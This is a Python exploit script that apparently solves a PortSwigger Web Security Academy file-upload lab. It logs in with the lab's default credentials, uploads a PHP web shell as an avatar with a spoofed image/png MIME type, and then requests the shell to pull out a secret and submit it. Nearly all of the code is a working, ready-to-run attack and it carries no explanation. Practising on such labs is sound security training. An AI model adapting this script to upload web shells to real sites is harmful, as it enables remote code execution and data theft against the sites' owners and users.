import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a34005804353b6980b218b900f80051.web-security-academy.net/"
PAYLOAD_PATH = "File Upload Vulnerabilities/lab1exploit.php"

def execute_upload_exploit(url):
    """Exploits a file upload vulnerability via Content-Type spoofing to exfiltrate a secret."""
    session = requests.Session()
    
    # 1. Authentication Phase
    print("[*] Initiating authentication...")
    login_endpoint = f"{url}login"
    
    login_page_response = session.get(login_endpoint)
    soup = BeautifulSoup(login_page_response.text, 'html.parser')
    login_csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": login_csrf_token
    }
    
    login_response = session.post(login_endpoint, data=credentials)
    if "Log out" not in login_response.text:
        print("[-] Authentication failed.")
        return
        
    print("[+] AUTHENTICATION SUCCESSFUL")

    # 2. Upload Preparation Phase
    print("[*] Extracting session CSRF token for file upload...")
    account_endpoint = f"{url}my-account"
    account_response = session.get(account_endpoint)
    soup = BeautifulSoup(account_response.text, 'html.parser')
    upload_csrf_token = soup.find("input", {"name": "csrf"})['value']

    # 3. Payload Delivery Phase
    print("[*] Uploading web shell payload with spoofed MIME type...")
    upload_endpoint = f"{url}my-account/avatar"
    
    with open(PAYLOAD_PATH, 'rb') as payload_file:
        upload_data = {
            "csrf": upload_csrf_token,
            "user": "wiener"
        }
        # Spoofing the MIME type to 'image/png' within the file tuple
        upload_files = {
            'avatar': ('lab1exploit.php', payload_file, 'image/png')
        }
        session.post(upload_endpoint, files=upload_files, data=upload_data)

    # 4. Execution & Exfiltration Phase
    print("[*] Executing web shell and extracting secret...")
    shell_endpoint = f"{url}files/avatars/lab1exploit.php"
    shell_response = session.get(shell_endpoint)
    secret_code = shell_response.text.strip()
    print(f"[+] SECRET EXTRACTED: {secret_code}")

    # 5. Submission Phase
    print("[*] Submitting extracted secret to lab validation endpoint...")
    submit_endpoint = f"{url}submitSolution"
    solution_data = {
        "answer": secret_code
    }
    submit_response = session.post(submit_endpoint, data=solution_data)
    
    if "true" in submit_response.text:
        print("[+] TARGET SECURED: LAB SOLVED SUCCESSFULLY")
    else:
        print("[-] Solution submission failed.")

if __name__ == "__main__":
    execute_upload_exploit(BASE_URL)